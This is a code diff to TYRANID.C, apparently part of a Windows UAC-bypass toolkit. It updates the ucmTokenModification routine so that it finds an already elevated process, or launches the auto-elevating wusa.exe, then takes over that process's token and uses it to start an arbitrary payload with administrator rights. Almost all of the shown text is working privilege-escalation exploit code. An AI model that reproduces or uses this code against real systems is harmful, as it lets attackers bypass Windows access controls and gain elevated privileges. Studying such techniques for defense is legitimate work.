@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017
+*  (C) COPYRIGHT AUTHORS, 2017 - 2018
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     2.85
+*  VERSION:     2.87
 *
-*  DATE:        01 Dec 2017
+*  DATE:        02 Mar 2018
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -84,54 +84,122 @@ BOOL ucmDiskCleanupEnvironmentVariable(
 *
 */
 BOOL ucmTokenModification(
-    _In_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload,
+    _In_ BOOL fUseCommandLine
 )
 {
-    BOOL bCond = FALSE, bResult = FALSE;
+    BOOL bCond = FALSE, bFound = FALSE, bResult = FALSE, bSelfRun = FALSE;
+    ULONG dummy;
     NTSTATUS Status = STATUS_UNSUCCESSFUL;
+    HANDLE hTargetProcess = NULL;
     HANDLE hProcessToken = NULL, hDupToken = NULL, hLuaToken = NULL, hImpToken = NULL;
+
+    LPWSTR lpApplicationName, lpCommandLine;
+    PSYSTEM_PROCESSES_INFORMATION ProcessList, pList;
 
     SID_IDENTIFIER_AUTHORITY MLAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
     PSID pIntegritySid = NULL;
     TOKEN_MANDATORY_LABEL tml;
     SECURITY_QUALITY_OF_SERVICE sqos;
     OBJECT_ATTRIBUTES obja;
+    CLIENT_ID cid;
 
     STARTUPINFO si;
     PROCESS_INFORMATION pi;
     SHELLEXECUTEINFO shinfo;
 
+    TOKEN_ELEVATION tei;
+
     RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
 
     do {
 
+        hTargetProcess = NULL;
+
         //
-        // Run autoelevated app (any).
+        // Attempt to locate already elevated process running in the system.
         //
-        shinfo.cbSize = sizeof(shinfo);
-        shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
-        shinfo.lpFile = WUSA_EXE;
-        shinfo.nShow = SW_HIDE;
-        if (!ShellExecuteEx(&shinfo)) {
+        InitializeObjectAttributes(&obja, NULL, 0, 0, NULL);
+        ProcessList = (PSYSTEM_PROCESSES_INFORMATION)supGetSystemInfo(SystemProcessInformation);
+        if (ProcessList) {
+            pList = ProcessList;
+            for (;;) {
+                cid.UniqueProcess = pList->UniqueProcessId;
+                cid.UniqueThread = NULL;
+
+                //
+                // Open process and query it process token elevation state.
+                //
+                Status = NtOpenProcess(&hTargetProcess, MAXIMUM_ALLOWED, &obja, &cid);
+                if (NT_SUCCESS(Status)) {
+                    Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
+                    if (NT_SUCCESS(Status)) {
+                        tei.TokenIsElevated = 0;
+                        Status = NtQueryInformationToken(hProcessToken,
+                            TokenElevation, &tei,
+                            sizeof(TOKEN_ELEVATION), &dummy);
+                        if (NT_SUCCESS(Status)) {
+                            //
+                            // Elevated process found, don't close it handles as we will re-use them next.
+                            //
+                            if (tei.TokenIsElevated > 0) {
+                                bFound = TRUE;
+                                break;
+                            }
+                        }
+                        NtClose(hProcessToken);
+                        hProcessToken = NULL;
+                    }
+                    NtClose(hTargetProcess);
+                    hTargetProcess = NULL;
+                }
+                if (pList->NextEntryDelta == 0) {
+                    break;
+                }
+                pList = (PSYSTEM_PROCESSES_INFORMATION)(((LPBYTE)pList) + pList->NextEntryDelta);
+            }
+            supHeapFree(ProcessList);
+        }
+
+        //
+        // If not found then run it youself.
+        //
+        if (hTargetProcess == NULL) {
+
+            //
+            // Run autoelevated app (any).
+            //
+            shinfo.cbSize = sizeof(shinfo);
+            shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+            shinfo.lpFile = WUSA_EXE;
+            shinfo.nShow = SW_HIDE;
+            if (!ShellExecuteEx(&shinfo)) {
 #ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->ShellExecute"),
-                GetLastError());
+                supDebugPrint(
+                    TEXT("ucmTokenModification->ShellExecute"),
+                    GetLastError());
 #endif
-            break;
+                break;
+            }
+            else {
+                bSelfRun = TRUE;
+                hTargetProcess = shinfo.hProcess;
+            }
         }
 
         //
         // Open token of elevated process.
         //
-        Status = NtOpenProcessToken(shinfo.hProcess, MAXIMUM_ALLOWED, &hProcessToken);
-        if (!NT_SUCCESS(Status)) {
+        if (hProcessToken == NULL) {
+            Status = NtOpenProcessToken(hTargetProcess, MAXIMUM_ALLOWED, &hProcessToken);
+            if (!NT_SUCCESS(Status)) {
 #ifdef _INT_DEBUG
-            supDebugPrint(
-                TEXT("ucmTokenModification->NtOpenProcessToken"),
-                Status);
+                supDebugPrint(
+                    TEXT("ucmTokenModification->NtOpenProcessToken"),
+                    Status);
 #endif
-            break;
+                break;
+            }
         }
 
         //
@@ -244,11 +312,24 @@ BOOL ucmTokenModification(
 
         RtlSecureZeroMemory(&pi, sizeof(pi));
 
+        if (fUseCommandLine) {
+            lpApplicationName = NULL;
+            lpCommandLine = lpszPayload;
+        }
+        else {
+            lpApplicationName = lpszPayload;
+            lpCommandLine = NULL;
+        }
+
         bResult = CreateProcessWithLogonW(TEXT("uac"), TEXT("is"), TEXT("useless"),
             LOGON_NETCREDENTIALS_ONLY,
-            lpszPayload,
-            NULL, 0, NULL, NULL,
-            &si, &pi);
+            lpApplicationName,
+            lpCommandLine,
+            0,
+            NULL,
+            NULL,
+            &si,
+            &pi);
 
         if (bResult) {
             if (pi.hThread) CloseHandle(pi.hThread);
@@ -278,10 +359,11 @@ BOOL ucmTokenModification(
     if (hProcessToken) NtClose(hProcessToken);
     if (hDupToken) NtClose(hDupToken);
     if (hLuaToken) NtClose(hLuaToken);
-    if (shinfo.hProcess) {
-        NtTerminateProcess(shinfo.hProcess, STATUS_SUCCESS);
-        NtClose(shinfo.hProcess);
+
+    if (bSelfRun) {
+        NtTerminateProcess(hTargetProcess, STATUS_SUCCESS);
     }
+    if (hTargetProcess) NtClose(hTargetProcess);
     if (pIntegritySid) RtlFreeSid(pIntegritySid);
 
     RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
